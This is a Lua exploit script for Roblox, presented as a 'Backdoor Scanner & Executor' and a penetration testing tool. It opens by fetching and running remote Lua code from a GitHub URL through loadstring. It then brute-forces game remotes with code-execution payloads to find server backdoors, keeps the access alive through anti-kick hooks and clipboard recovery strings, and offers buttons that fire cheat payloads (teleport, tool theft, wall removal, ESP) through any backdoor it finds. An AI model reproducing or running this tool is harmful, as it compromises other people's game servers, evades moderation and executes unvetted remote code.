--[[
    Backdoor Scanner & Executor v3.1 - CLIENT SIDE ANTI KICK
    Authorized Penetration Testing Tool - Roblox
    Features: Pre-copies backdoor data on discovery, client-side clipboard persistence
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/raavenkkj/anti-kick/main/anti-kick.lua"))()
getgenv().AntiKick = true -- Optional
getgenv().Notifications = true -- Optional

-- Initialize
pcall(function() game.CoreGui["BackdoorScanner"]:Destroy() end)

-- ===== CLIPBOARD UTILITY =====
local function copyToClipboard(text)
    if not text then return end
    
    -- Store in global for persistence
    _G.__BD_Clipboard = text
    
    -- Try ALL methods immediately
    local methods = {
        function() -- TextBox capture
            local box = Instance.new("TextBox")
            box.Parent = game:GetService("CoreGui")
            box.Size = UDim2.new(0, 0, 0, 0)
            box.Visible = false
            box.Text = text
            box:CaptureFocus()
            task.wait()
            box:SelectAll()
            task.wait()
            box:Copy()
            box:Destroy()
            return true
        end,
        function() -- Clipboard service
            game:GetService("Clipboard"):Set(text)
            return true
        end,
        function() -- Executor clipboard functions
            pcall(function() setclipboard(text) end)
            pcall(function() writeclipboard(text) end)
            pcall(function() toclipboard(text) end)
            pcall(function() Synapse:SetClipboard(text) end)
            return true
        end
    }
    
    for _, method in ipairs(methods) do
        local ok = pcall(method)
        if ok then break end
    end
    
    -- Also console print as backup
    print("\n========== BACKDOOR DATA (COPIED TO CLIPBOARD) ==========")
    print(text)
    print("=========================================================\n")
end

-- Generate recovery string
local function generateRecoveryString(remote, name, class)
    if not remote and not name then return nil end
    
    local remotePath = name or (remote and remote:GetFullName()) or "Unknown"
    local remoteClass = class or (remote and remote.ClassName) or "RemoteEvent"
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    return string.format([[
-- BACKDOOR RECOVERY - Paste in executor after rejoining
local bd = {path=%q, class=%q, place=%d, job=%q}
local function g()
    local p = string.split(bd.path,"."); local o=game
    for _,v in ipairs(p) do o=o:FindFirstChild(v) if not o then return nil end end
    if o and (o:IsA("RemoteEvent")or o:IsA("RemoteFunction")) then return o end
end
local function e(c)
    local r=g() if not r then print("BD not found") return end
    if r:IsA("RemoteEvent") then r:FireServer(c) else r:InvokeServer(c) end
end
e("print('Backdoor reconnected!')")
print("Usage: e('your code here')")
]], remotePath, remoteClass, placeId, jobId)
end

-- ===== CLIENT-SIDE ANTI KICK =====
local AntiKick = {}
AntiKick.Initialized = false

function AntiKick:Init(backdoorData)
    if self.Initialized then return end
    self.Initialized = true
    
    local remote = backdoorData and backdoorData.Remote
    local name = backdoorData and backdoorData.Name
    local class = backdoorData and backdoorData.Class
    
    if not remote and not name then return end
    
    -- Pre-generate and IMMEDIATELY copy to clipboard NOW (before any kick)
    local recoveryStr = generateRecoveryString(remote, name, class)
    if recoveryStr then
        _G.__BD_Recovery = recoveryStr
        copyToClipboard(recoveryStr)
        print("[CLIPBOARD] Backdoor recovery data stored. Ready for kick.")
    end
    
    local player = game:GetService("Players").LocalPlayer
    if not player then return end
    
    -- OPTION 1: Block kick by hooking Player removal
    player:GetPropertyChangedSignal("Parent"):Connect(function()
        if player.Parent ~= game:GetService("Players") then
            if recoveryStr then
                copyToClipboard(recoveryStr)
                _G.__BD_KickSave = recoveryStr
                _G.__BD_KickTime = tick()
            end
            print("[ANTI-KICK] Kick detected! Data saved to clipboard before disconnect.")
            print("[ANTI-KICK] Rejoin manually. Your backdoor data is in clipboard.")
        end
    end)
    
    -- OPTION 2: Heartbeat monitor
    local hb
    hb = game:GetService("RunService").Heartbeat:Connect(function()
        if not player or not player.Parent then
            if recoveryStr then
                copyToClipboard(recoveryStr)
                _G.__BD_KickSave = recoveryStr
            end
            print("[ANTI-KICK] Disconnect detected via heartbeat! Data saved.")
            if hb then hb:Disconnect() end
        end
    end)
    
    -- OPTION 3: Character removal
    if player.Character then
        local function onCharRemoved()
            task.wait(0.1)
            if player and player.Parent == game:GetService("Players") then
                if recoveryStr then
                    _G.__BD_CharSave = recoveryStr
                end
            end
        end
        
        player.Character.AncestryChanged:Connect(function()
            if not player.Character or not player.Character.Parent then
                onCharRemoved()
            end
        end)
    end
    
    -- OPTION 4: LogService error detection
    local ls = game:GetService("LogService")
    if ls then
        ls.MessageOut:Connect(function(msg, msgType)
            if msgType == Enum.MessageType.MessageError then
                local m = msg:lower()
                if m:find("kick") or m:find("disconnect") or m:find("banned") then
                    if recoveryStr then
                        copyToClipboard(recoveryStr)
                        _G.__BD_LogSave = recoveryStr
                    end
                    print("[ANTI-KICK] Kick message detected! Data saved.")
                end
            end
        end)
    end
    
    -- OPTION 5: CoreGui cleanup detection
    game:GetService("CoreGui").ChildRemoved:Connect(function(child)
        if child and child.Name == "BackdoorScanner" then
            if _G.__BD_Recovery then
                copyToClipboard(_G.__BD_Recovery)
            end
        end
    end)
    
    print("[AntiKick] Active. Recovery data in clipboard. All 5 safeguard methods running.")
end

-- ===== BACKDOOR SCANNER =====
local Scanner = {}
Scanner.Found = {}
Scanner.Scanning = false
Scanner.SelectedBackdoor = nil

local function generateName(length)
    local chars = {}
    for c = 48,57 do chars[#chars+1]=string.char(c) end
    for c = 65,90 do chars[#chars+1]=string.char(c) end
    for c = 97,122 do chars[#chars+1]=string.char(c) end
    local n = ""
    for i=1,length do n = n .. chars[math.random(#chars)] end
    return n
end

local function testRemote(remote, testCode)
    local payloads = {
        string.format("Instance.new('Model',workspace).Name='%s'", testCode),
        {"bypass", string.format("Instance.new('Model',workspace).Name='%s'", testCode)},
        {code = string.format("Instance.new('Model',workspace).Name='%s'", testCode)},
        {"", string.format("Instance.new('Model',workspace).Name='%s'", testCode)},
    }
    
    for _, payload in ipairs(payloads) do
        local ok = pcall(function()
            if remote:IsA("RemoteEvent") then
                if type(payload) == "table" then
                    remote:FireServer(unpack(payload))
                else
                    remote:FireServer(payload)
                end
            else
                task.spawn(function()
                    pcall(function()
                        if type(payload) == "table" then
                            remote:InvokeServer(unpack(payload))
                        else
                            remote:InvokeServer(payload)
                        end
                    end)
                end)
            end
        end)
        
        if ok then
            for i=1,30 do
                local m = workspace:FindFirstChild(testCode)
                if m then m:Destroy(); return true end
                task.wait(0.1)
            end
        end
    end
    return false
end

-- METHOD 1: Pattern-based
local function checkPatterns(rs)
    local found = {}
    local patterns = {"lua_", "bd_", "backdoor", "exec_", "run_", "eval_", "cmd_", "shell_", "admin_", "lh", "nxo_"}
    
    for _, v in ipairs((rs or game):GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local name = v.Name:lower()
            for _, pat in ipairs(patterns) do
                if name:find(pat) then
                    local tc = generateName(8)
                    if testRemote(v, tc) then table.insert(found, v) end
                    break
                end
            end
        end
    end
    return found
end

-- METHOD 2: Synapse/NXO specific
local function checkSynapse(rs)
    local found = {}
    if not rs then return found end
    
    local bdName = "lh" .. math.floor(game.PlaceId / 6666 * 1337 * game.PlaceId)
    local special = rs:FindFirstChild(bdName)
    if special and (special:IsA("RemoteEvent") or special:IsA("RemoteFunction")) then
        local tc = generateName(8)
        if testRemote(special, tc) then table.insert(found, special) end
    end
    
    for _, name in ipairs({"nxo_" .. game.PlaceId, "remote_" .. game.PlaceId, "exec_" .. game.PlaceId}) do
        local v = rs:FindFirstChild(name)
        if v and (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
            local tc = generateName(8)
            if testRemote(v, tc) then table.insert(found, v) end
        end
    end
    
    return found
end

-- METHOD 3: Suspicious containers
local function checkContainers()
    local found = {}
    local containers = {game:FindFirstChild("ReplicatedStorage"), game:FindFirstChild("ServerStorage"), game:FindFirstChild("ServerScriptService")}
    
    for _, container in ipairs(containers) do
        if container then
            for _, v in ipairs(container:GetDescendants()) do
                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                    local tc = generateName(8)
                    if testRemote(v, tc) then table.insert(found, v) end
                end
            end
        end
    end
    return found
end

-- METHOD 4: Deep nested
local function checkDeepNested()
    local found = {}
    for _, v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local depth = 0
            local p = v.Parent
            while p do depth = depth + 1; p = p.Parent; if depth > 20 then break end end
            
            if depth > 4 then
                local tc = generateName(8)
                if testRemote(v, tc) then table.insert(found, v) end
            end
        end
    end
    return found
end

-- METHOD 5: All remotes brute force
local function checkAll()
    local found = {}
    local safe = {"RobloxReplicatedStorage", "DefaultChatSystem", "ChatService", "TeleportService", "SoundService", "StarterGui"}
    
    for _, v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local fn = v:GetFullName()
            local skip = false
            for _, s in ipairs(safe) do
                if fn:find(s) then skip = true; break end
            end
            if not skip then
                local tc = generateName(8)
                if testRemote(v, tc) then table.insert(found, v) end
                task.wait(0.02)
            end
        end
    end
    return found
end

function Scanner:ScanAll(progressCallback)
    self.Scanning = true
    self.Found = {}
    local allFound = {}
    
    local function addUnique(list)
        for _, v in ipairs(list) do
            local path = v:GetFullName()
            local dup = false
            for _, existing in ipairs(allFound) do
                if existing:GetFullName() == path then dup = true; break end
            end
            if not dup then
                table.insert(allFound, v)
                table.insert(self.Found, {Remote = v, Name = v:GetFullName(), Class = v.ClassName})
            end
        end
    end
    
    local rs = game:FindFirstChild("ReplicatedStorage")
    
    progressCallback("[Method 1/5] Pattern matching...", 10)
    addUnique(checkPatterns(rs))
    task.wait(0.1)
    if not self.Scanning then return end
    
    progressCallback("[Method 2/5] Synapse/NXO check...", 25)
    addUnique(checkSynapse(rs))
    task.wait(0.1)
    if not self.Scanning then return end
    
    progressCallback("[Method 3/5] Suspicious containers...", 40)
    addUnique(checkContainers())
    task.wait(0.1)
    if not self.Scanning then return end
    
    progressCallback("[Method 4/5] Deep nesting scan...", 60)
    addUnique(checkDeepNested())
    task.wait(0.1)
    if not self.Scanning then return end
    
    progressCallback("[Method 5/5] Brute force all remotes...", 80)
    addUnique(checkAll())
    
    self.Scanning = false
    
    for i, bd in ipairs(self.Found) do
        local recoveryStr = generateRecoveryString(bd.Remote, bd.Name, bd.Class)
        if recoveryStr then
            if i == 1 then
                copyToClipboard(recoveryStr)
                print("[Backdoor #1] Recovery data COPIED TO CLIPBOARD!")
            end
            _G["__BD_" .. i] = recoveryStr
        end
        AntiKick:Init(bd)
    end
    
    progressCallback(string.format("Complete! %d backdoor(s). Clipboard ready. Anti-kick active.", #self.Found), 100)
    
    return self.Found
end

-- ===== GUI =====
local gui = Instance.new("ScreenGui")
gui.Name = "BackdoorScanner"
gui.Parent = game.CoreGui
gui.ResetOnSpawn = false

local main = Instance.new("Frame")
main.Parent = gui
main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
main.BorderSizePixel = 0
main.Position = UDim2.new(0.5, -400, 0.5, -225)
main.Size = UDim2.new(0, 800, 0, 500)
main.Active = true
main.Draggable = true

-- Title
local titleBar = Instance.new("Frame")
titleBar.Parent = main
titleBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
titleBar.BorderSizePixel = 0
titleBar.Size = UDim2.new(1, 0, 0, 30)

local titleText = Instance.new("TextLabel")
titleText.Parent = titleBar
titleText.BackgroundTransparency = 1
titleText.Size = UDim2.new(1, -60, 1, 0)
titleText.Font = Enum.Font.SourceSans
titleText.Text = "Backdoor Scanner v3.1 | Pre-copies to clipboard | Client-Side Anti-Kick"
titleText.TextColor3 = Color3.fromRGB(200, 200, 200)
titleText.TextSize = 16
titleText.TextXAlignment = Enum.TextXAlignment.Left

local closeBtn = Instance.new("TextButton")
closeBtn.Parent = titleBar
closeBtn.BackgroundTransparency = 1
closeBtn.Position = UDim2.new(1, -30, 0, 0)
closeBtn.Size = UDim2.new(0, 30, 1, 0)
closeBtn.Font = Enum.Font.SourceSans
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
closeBtn.TextSize = 18
closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

-- LEFT PANEL
local leftPanel = Instance.new("Frame")
leftPanel.Parent = main
leftPanel.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
leftPanel.BorderSizePixel = 0
leftPanel.Position = UDim2.new(0, 0, 0, 35)
leftPanel.Size = UDim2.new(0, 250, 1, -40)

local scanTitle = Instance.new("TextLabel")
scanTitle.Parent = leftPanel
scanTitle.BackgroundTransparency = 1
scanTitle.Position = UDim2.new(0, 10, 0, 5)
scanTitle.Size = UDim2.new(1, -20, 0, 20)
scanTitle.Font = Enum.Font.SourceSans
scanTitle.Text = "Scanner (5 methods)"
scanTitle.TextColor3 = Color3.fromRGB(180, 180, 180)
scanTitle.TextSize = 14
scanTitle.TextXAlignment = Enum.TextXAlignment.Left

local statusLabel = Instance.new("TextLabel")
statusLabel.Parent = leftPanel
statusLabel.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
statusLabel.BorderSizePixel = 0
statusLabel.Position = UDim2.new(0, 10, 0, 30)
statusLabel.Size = UDim2.new(1, -20, 0, 22)
statusLabel.Font = Enum.Font.Code
statusLabel.Text = "Ready | Clipboard: READY"
statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
statusLabel.TextSize = 12
statusLabel.TextXAlignment = Enum.TextXAlignment.Left

local progressBg = Instance.new("Frame")
progressBg.Parent = leftPanel
progressBg.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
progressBg.BorderSizePixel = 0
progressBg.Position = UDim2.new(0, 10, 0, 58)
progressBg.Size = UDim2.new(1, -20, 0, 6)

local progressBar = Instance.new("Frame")
progressBar.Parent = progressBg
progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
progressBar.BorderSizePixel = 0
progressBar.Size = UDim2.new(0, 0, 1, 0)

local scanBtn = Instance.new("TextButton")
scanBtn.Parent = leftPanel
scanBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 200)
scanBtn.BorderSizePixel = 0
scanBtn.Position = UDim2.new(0, 10, 0, 72)
scanBtn.Size = UDim2.new(1, -20, 0, 28)
scanBtn.Font = Enum.Font.SourceSans
scanBtn.Text = "START SCAN"
scanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
scanBtn.TextSize = 14

local resultsTitle = Instance.new("TextLabel")
resultsTitle.Parent = leftPanel
resultsTitle.BackgroundTransparency = 1
resultsTitle.Position = UDim2.new(0, 10, 0, 108)
resultsTitle.Size = UDim2.new(1, -20, 0, 16)
resultsTitle.Font = Enum.Font.SourceSans
resultsTitle.Text = "Found Backdoors (clipped on find):"
resultsTitle.TextColor3 = Color3.fromRGB(150, 150, 150)
resultsTitle.TextSize = 12
resultsTitle.TextXAlignment = Enum.TextXAlignment.Left

local resultList = Instance.new("ScrollingFrame")
resultList.Parent = leftPanel
resultList.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
resultList.BorderSizePixel = 0
resultList.Position = UDim2.new(0, 10, 0, 128)
resultList.Size = UDim2.new(1, -20, 1, -138)
resultList.CanvasSize = UDim2.new(0, 0, 0, 0)
resultList.ScrollBarThickness = 4

-- MIDDLE PANEL (Payloads)
local middlePanel = Instance.new("Frame")
middlePanel.Parent = main
middlePanel.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
middlePanel.BorderSizePixel = 0
middlePanel.Position = UDim2.new(0, 255, 0, 35)
middlePanel.Size = UDim2.new(0, 190, 1, -40)

local exampleTitle = Instance.new("TextLabel")
exampleTitle.Parent = middlePanel
exampleTitle.BackgroundTransparency = 1
exampleTitle.Position = UDim2.new(0, 10, 0, 5)
exampleTitle.Size = UDim2.new(1, -20, 0, 20)
exampleTitle.Font = Enum.Font.SourceSans
exampleTitle.Text = "Payloads"
exampleTitle.TextColor3 = Color3.fromRGB(180, 180, 180)
exampleTitle.TextSize = 14
exampleTitle.TextXAlignment = Enum.TextXAlignment.Left

local exampleList = Instance.new("ScrollingFrame")
exampleList.Parent = middlePanel
exampleList.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
exampleList.BorderSizePixel = 0
exampleList.Position = UDim2.new(0, 10, 0, 28)
exampleList.Size = UDim2.new(1, -20, 1, -38)
exampleList.CanvasSize = UDim2.new(0, 0, 0, 0)
exampleList.ScrollBarThickness = 4

-- RIGHT PANEL (Console/Log)
local rightPanel = Instance.new("Frame")
rightPanel.Parent = main
rightPanel.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
rightPanel.BorderSizePixel = 0
rightPanel.Position = UDim2.new(0, 450, 0, 35)
rightPanel.Size = UDim2.new(1, -455, 1, -40)

local consoleTitle = Instance.new("TextLabel")
consoleTitle.Parent = rightPanel
consoleTitle.BackgroundTransparency = 1
consoleTitle.Position = UDim2.new(0, 10, 0, 5)
consoleTitle.Size = UDim2.new(1, -20, 0, 20)
consoleTitle.Font = Enum.Font.SourceSans
consoleTitle.Text = "Console"
consoleTitle.TextColor3 = Color3.fromRGB(180, 180, 180)
consoleTitle.TextSize = 14
consoleTitle.TextXAlignment = Enum.TextXAlignment.Left

local consoleBox = Instance.new("ScrollingFrame")
consoleBox.Parent = rightPanel
consoleBox.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
consoleBox.BorderSizePixel = 0
consoleBox.Position = UDim2.new(0, 10, 0, 28)
consoleBox.Size = UDim2.new(1, -20, 1, -38)
consoleBox.CanvasSize = UDim2.new(0, 0, 0, 0)
consoleBox.ScrollBarThickness = 4

-- Console logging function
local function logToConsole(msg, color)
    color = color or Color3.fromRGB(200, 200, 200)
    local label = Instance.new("TextLabel")
    label.Parent = consoleBox
    label.BackgroundTransparency = 1
    label.Size = UDim2.new(1, -5, 0, 18)
    label.Position = UDim2.new(0, 5, 0, consoleBox.CanvasSize.Y.Offset)
    label.Font = Enum.Font.Code
    label.Text = msg
    label.TextColor3 = color
    label.TextSize = 11
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.TextWrapped = true
    consoleBox.CanvasSize = UDim2.new(0, 0, 0, consoleBox.CanvasSize.Y.Offset + 18)
    consoleBox.CanvasPosition = UDim2.new(0, 0, 1, 0)
end

-- Hook into print for console
local oldPrint = print
print = function(...)
    local args = {...}
    local msg = table.concat(args, " ")
    oldPrint(...)
    logToConsole(msg)
end

-- Payload buttons
local payloads = {
    {"tp all", "game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 100, 0)"},
    {"give tools", "local p = game:GetService('Players').LocalPlayer; p.Backpack:ClearAllChildren(); for _, v in pairs(workspace.Tools:GetChildren()) do v:Clone().Parent = p.Backpack end"},
    {"remove walls", "for _, v in pairs(workspace:GetDescendants()) do if v:IsA('BasePart') and v.Anchored and v.BrickColor ~= BrickColor.new('Medium stone grey') then v:Destroy() end end"},
    {"esp", "local p = game:GetService('Players').LocalPlayer; for _, v in pairs(workspace:GetDescendants()) do if v:IsA('BasePart') and v.Parent:FindFirstChildOfClass('Humanoid') then local b = Instance.new('BillboardGui', v); b.AlwaysOnTop = true; local l = Instance.new('TextLabel', b); l.Text = v.Parent.Name; l.Size = UDim2.new(0, 100, 0, 20); l.BackgroundTransparency = 1; l.TextColor3 = Color3.new(1, 0, 0); l.TextStrokeTransparency = 0 end end"},
}

for i, payloadData in ipairs(payloads) do
    local btn = Instance.new("TextButton")
    btn.Parent = exampleList
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    btn.BorderSizePixel = 0
    btn.Position = UDim2.new(0, 5, 0, 5 + (i - 1) * 30)
    btn.Size = UDim2.new(1, -10, 0, 25)
    btn.Font = Enum.Font.SourceSans
    btn.Text = payloadData[1]
    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
    btn.TextSize = 13
    
    btn.MouseButton1Click:Connect(function()
        if Scanner.Found and #Scanner.Found > 0 then
            local bd = Scanner.Found[1]
            if bd and bd.Remote then
                local remote = bd.Remote
                local ok = pcall(function()
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer(payloadData[2])
                    else
                        remote:InvokeServer(payloadData[2])
                    end
                end)
                if ok then
                    logToConsole("[+] Executed: " .. payloadData[1], Color3.fromRGB(100, 255, 100))
                else
                    logToConsole("[-] Failed: " .. payloadData[1], Color3.fromRGB(255, 100, 100))
                end
            end
        else
            logToConsole("[!] No backdoors found yet. Scan first.", Color3.fromRGB(255, 200, 50))
        end
    end)
    
    exampleList.CanvasSize = UDim2.new(0, 0, 0, 5 + #payloads * 30)
end

-- Scan button logic
scanBtn.MouseButton1Click:Connect(function()
    scanBtn.Text = "SCANNING..."
    scanBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 0)
    scanBtn.Active = false
    
    Scanner:ScanAll(function(status, progress)
        statusLabel.Text = status
        progressBar.Size = UDim2.new(progress / 100, 0, 1, 0)
        logToConsole(status)
    end)
    
    scanBtn.Text = "START SCAN"
    scanBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 200)
    scanBtn.Active = true
end)

logToConsole("[Backdoor Scanner v3.1] Loaded. Clipboard ready. Scan to begin.")
logToConsole("[Anti-Kick] Active. Recovery data persists on kick.")